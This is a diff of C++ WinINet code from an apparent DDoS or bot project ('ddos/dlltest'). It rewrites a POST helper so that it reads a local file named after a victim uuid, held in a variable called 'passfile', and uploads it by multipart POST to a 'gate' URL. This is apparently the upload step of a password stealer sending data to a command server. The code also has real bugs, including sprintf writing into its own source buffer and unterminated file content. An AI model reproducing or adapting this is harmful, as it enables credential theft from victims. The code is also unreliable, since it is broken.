@@ -3,7 +3,7 @@
 #include <wininet.h>
 #include <string>
 #include "../../ddos/dlltest/URL.h"
-
+#pragma warning(disable:4996)
 
 using namespace std;
 
@@ -12,52 +12,80 @@ using namespace std;
 
 
 
-std::string postRequest(std::string url, std::string param, LPCSTR method = "POST", std::string useragent = "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3")
+std::string postRequest(std::string uuid, std::string gate)
 {
-
+	std::string passfile = uuid + ".txt";
+	
 
 	char* host;
 	char* path;
-	HTTPURL u(url);
+	HTTPURL u(gate);
 
 
 	host = (char*)u.domain.c_str();
 	path = (char*)u.path.c_str();
-	HINTERNET hSession;
-	TCHAR hdrs[] = TEXT("Content-Type: application/x-www-form-urlencoded");
-	LPVOID frmdata = (LPVOID)param.c_str();
-	LPCSTR accept[2] = { "text/plain", NULL };
-
-	hSession = InternetOpen((LPCSTR)useragent.c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-
 	
+	// Local variables
+	static char* filename = (char*)passfile.c_str();   //Filename to be loaded
+	static char* type = (char*) "text/plain";
+	static char boundary[] = "pippo";            //Header boundary
+	static char nameForm[] = "media";     //Input form name
+
+	char hdrs[255];                  //Headers
+	char* buffer;                   //Buffer containing file + headers
+	char* content;                  //Buffer containing file
+	FILE* pFile;                    //File pointer
+	long lSize;                      //File size
+	size_t result;
+
+
+	// Open file
+	pFile = fopen(filename, "rb");
+	if (pFile == NULL) return "";
+
+	// obtain file size:
+	fseek(pFile, 0, SEEK_END);
+	lSize = ftell(pFile);
+	rewind(pFile);
+
+	// allocate memory to contain the whole file:
+	content = (char*)malloc(sizeof(char) * lSize);
+	if (content == NULL) return "";
+
+	// copy the file into the buffer:
+	result = fread(content, 1, lSize, pFile);
+	if (result != lSize) return "";
+
+	// terminate
+	fclose(pFile);
+
+	//allocate memory to contain the whole file + HEADER
+	buffer = (char*)malloc(sizeof(char) * lSize + 2048);
+
+	//print header
+	sprintf(hdrs, "Content-Type: multipart/form-data; boundary=%s", boundary);
+	sprintf(buffer, "--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\n", boundary, nameForm, filename);
+	sprintf(buffer, "%sContent-Type: %s\r\n\r\n", buffer, type);
+	sprintf(buffer, "%s%s\r\n", buffer, content);
+	sprintf(buffer, "%s--%s--\r\n", buffer, boundary);
+
+	//Open internet connection
+	HINTERNET hSession = InternetOpen("WinSock", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+	if (hSession == NULL) return "";
+
 	HINTERNET hConnect = InternetConnect(hSession, host, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
-	HINTERNET hRequest = HttpOpenRequest(hConnect, method, path, NULL, NULL, accept, INTERNET_FLAG_RESYNCHRONIZE | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_RELOAD, 1);
+	if (hConnect == NULL) return "";
 
+	HINTERNET hRequest = HttpOpenRequest(hConnect, (const char*)"POST", path, NULL, NULL, (const char**)"*/*\0", 0, 1);
+	if (hRequest == NULL) return "";
 
+	BOOL sent = HttpSendRequest(hRequest, hdrs, strlen(hdrs), buffer, strlen(buffer));
+	if (!sent) return "";
 
-	if (!HttpSendRequest(hRequest,
-		hdrs,
-		strlen(hdrs),
-		frmdata, //lpOptional <--Your POST data...not really optional for you.
-		strlen(param.c_str()))) {
-		DWORD errorCode = GetLastError();
-		std::cout << errorCode;
-	}
-	//HttpSendRequest(hRequest, hdrs, strlen(hdrs), frmdata, strlen(param.c_str()));
-	DWORD rSize;
-	char tmp[1024 + 1];
-	string szBuffer;
-
-	while (InternetReadFile(hRequest, tmp, 1024, &rSize) && rSize > 0)
-	{
-		tmp[rSize] = '\0';
-		szBuffer += (string)tmp;
-	}
+	//close any valid internet-handles
 	InternetCloseHandle(hSession);
 	InternetCloseHandle(hConnect);
 	InternetCloseHandle(hRequest);
-	//std::cout << szBuffer;
-	return szBuffer;
 
+	return "";
 }
